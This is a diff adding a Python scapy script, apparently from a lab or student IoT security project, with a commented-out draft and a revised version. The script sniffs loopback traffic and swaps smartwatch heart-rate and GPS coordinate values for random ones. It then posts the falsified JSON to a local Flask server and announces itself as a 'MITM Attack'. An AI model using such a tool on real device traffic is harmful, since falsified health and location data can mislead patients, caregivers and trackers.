@@ -1,0 +1,109 @@
+# from scapy.all import *
+# import requests
+# import json
+
+# # Define the interface you're sniffing on
+# INTERFACE = "\\Device\\NPF_Loopback"  # Change this to the appropriate interface name on your system
+
+# # Define the Flask server endpoint
+# FLASK_SERVER_URL = "http://127.0.0.1:5000/data"
+
+# # Function to process and modify the packet
+# def process_packet(packet):
+#     if packet.haslayer(IP):
+#         # Check if the packet is from the Smartwatch (based on the destination IP or port)
+#         if packet.haslayer(TCP) and packet.haslayer(Raw):
+#             raw_data = packet[Raw].load.decode(errors="ignore")
+            
+#             # Look for heart_rate data (Smartwatch)
+#             if "heart_rate" in raw_data:
+#                 print(f"Original Smartwatch Data: {raw_data}")
+                
+#                 # Modify the heart rate value (for example, increase it by 10)
+#                 modified_data = raw_data.replace('"heart_rate":', '"heart_rate":' + str(random.randint(100, 150)))
+#                 print(f"Modified Smartwatch Data: {modified_data}")
+
+#                 # Send the modified data to Flask server via POST request
+#                 payload = {"data": modified_data}
+#                 headers = {'Content-Type': 'application/json'}
+#                 response = requests.post(FLASK_SERVER_URL, json=payload, headers=headers)
+                
+#                 if response.status_code == 200:
+#                     print(f"[Smartwatch] Data successfully sent to Flask server")
+#                 else:
+#                     print(f"[Smartwatch] Failed to send data to Flask server: {response.status_code}")
+
+#             # Look for latitude/longitude data (GPS Tracker)
+#             elif "latitude" in raw_data and "longitude" in raw_data:
+#                 print(f"Original GPS Data: {raw_data}")
+                
+#                 # Modify the GPS coordinates (e.g., move to a fixed location or adjust values)
+#                 modified_data = raw_data.replace('"latitude":', '"latitude":' + str(random.uniform(10, 50)))
+#                 modified_data = modified_data.replace('"longitude":', '"longitude":' + str(random.uniform(10, 50)))
+#                 print(f"Modified GPS Data: {modified_data}")
+
+#                 # Send the modified data to Flask server via POST request
+#                 payload = {"data": modified_data}
+#                 headers = {'Content-Type': 'application/json'}
+#                 response = requests.post(FLASK_SERVER_URL, json=payload, headers=headers)
+                
+#                 if response.status_code == 200:
+#                     print(f"[GPS] Data successfully sent to Flask server")
+#                 else:
+#                     print(f"[GPS] Failed to send data to Flask server: {response.status_code}")
+
+# # Start sniffing the traffic and processing packets
+# print("[*] Starting MITM Attack...")
+# sniff(iface=INTERFACE, prn=process_packet, store=False)
+
+from scapy.all import sniff, IP, TCP, Raw
+import requests
+import json
+import random  # Ensure random is imported
+
+# Change this to the appropriate interface name on your system
+INTERFACE = "\\Device\\NPF_Loopback"
+
+# Define the Flask server endpoint
+FLASK_SERVER_URL = "http://127.0.0.1:5000/data"
+
+def process_packet(packet):
+    # Process packets that have the layers we're interested in.
+    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
+        try:
+            raw_data = packet[Raw].load.decode(errors="ignore")
+            # Attempt to parse the raw data as JSON.
+            data_json = json.loads(raw_data)
+        except Exception as e:
+            print(f"Packet data is not valid JSON: {e}")
+            return
+
+        # Check for heart rate data (Smartwatch)
+        if "heart_rate" in data_json:
+            print(f"Original Smartwatch Data: {data_json}")
+            # Modify the heart_rate value (e.g., increase it by choosing a new random value)
+            data_json["heart_rate"] = random.randint(100, 150)
+            print(f"Modified Smartwatch Data: {data_json}")
+
+            response = requests.post(FLASK_SERVER_URL, json=data_json)
+            if response.status_code == 200:
+                print("[Smartwatch] Data successfully sent to Flask server")
+            else:
+                print(f"[Smartwatch] Failed to send data: {response.status_code}")
+
+        # Check for GPS data with both latitude and longitude
+        elif "latitude" in data_json and "longitude" in data_json:
+            print(f"Original GPS Data: {data_json}")
+            # Modify GPS coordinates with new random values within a specific range
+            data_json["latitude"] = random.uniform(10, 50)
+            data_json["longitude"] = random.uniform(10, 50)
+            print(f"Modified GPS Data: {data_json}")
+
+            response = requests.post(FLASK_SERVER_URL, json=data_json)
+            if response.status_code == 200:
+                print("[GPS] Data successfully sent to Flask server")
+            else:
+                print(f"[GPS] Failed to send data: {response.status_code}")
+
+print("[*] Starting MITM Attack...")
+sniff(iface=INTERFACE, prn=process_packet, store=False)
